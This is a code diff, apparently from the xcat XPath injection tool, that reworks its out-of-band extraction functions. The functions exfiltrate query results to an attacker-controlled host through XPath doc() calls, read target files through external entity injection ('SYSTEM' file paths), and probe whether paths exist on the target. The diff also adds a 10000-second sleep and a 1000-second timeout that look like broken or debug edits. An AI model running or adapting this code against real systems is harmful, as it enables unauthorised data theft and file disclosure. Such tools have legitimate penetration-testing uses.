@@ -2,11 +2,13 @@ import asyncio
 import base64
 import string as stdlib_string
 
+from xcat import oob
 from xcat.attack import AttackContext, check
 from xpath import ROOT_NODE
 from xpath.functions import (concat, count as xpath_count, doc, encode_for_uri,
                              normalize_space, string, string_length,
-                             string_to_codepoints, substring, substring_before)
+                             string_to_codepoints, substring, substring_before,
+                             doc_available as xpath_doc_available)
 from xpath.functions.fs import base_64_binary, write_binary
 
 from .display import XMLNode
@@ -97,7 +99,6 @@ async def get_string(context: AttackContext, expression, disable_normalization=F
     else:
         if len(result) <= 10:
             context.common_strings[result] += 1
-
     return result
 
 
@@ -115,23 +116,26 @@ async def upload_file_via_oob(context: AttackContext, remote_path, file_bytes: b
 
 
 async def get_string_via_oob(context: AttackContext, expression):
-    server = await requester.get_oob_server()
-    url, future = server.expect_data()
-
-    oob_expr = doc(concat(f'{url}?d=', encode_for_uri(expression))) / 'data' == server.test_response_value
+    identifier, future = oob.expect_data(context.oob_app)
+    url = f'{context.oob_host}/data/{identifier}?d='
+    oob_expr = doc(concat(url, encode_for_uri(expression))) / 'data' == context.oob_app['test_response_value']
     if not await check(context, oob_expr):
+        await asyncio.sleep(10000)
         return None
 
     try:
-        return await asyncio.wait_for(future, timeout=5)
+        return await asyncio.wait_for(future, timeout=1000)
     except asyncio.TimeoutError:
         return None
 
 
-async def get_file_via_entity_injection(context: AttackContext, file_path):
-    server = await requester.get_oob_server()
-    url, future = server.expect_entity_injection('SYSTEM "{file_path}"'.format(file_path=file_path))
+async def doc_available(context: AttackContext, path):
+    return await check(context, xpath_doc_available(path))
 
+
+async def get_file_via_entity_injection(context: AttackContext, file_path):
+    identifier, future = oob.expect_entity_injection(context.oob_app, f'SYSTEM "{file_path}"')
+    url = f'{context.oob_host}/entity/{identifier}'
     return await get_string_via_oob(context, doc(url) / 'data')
 
 
@@ -151,9 +155,7 @@ async def get_all_text(context: AttackContext, expression):
 
 async def get_node_comments(context: AttackContext, expression):
     comments_count = await count(context, expression.comments)
-
     futures = [get_string(context, comment) for comment in expression.comments(comments_count)]
-
     return await asyncio.gather(*futures)
 
 
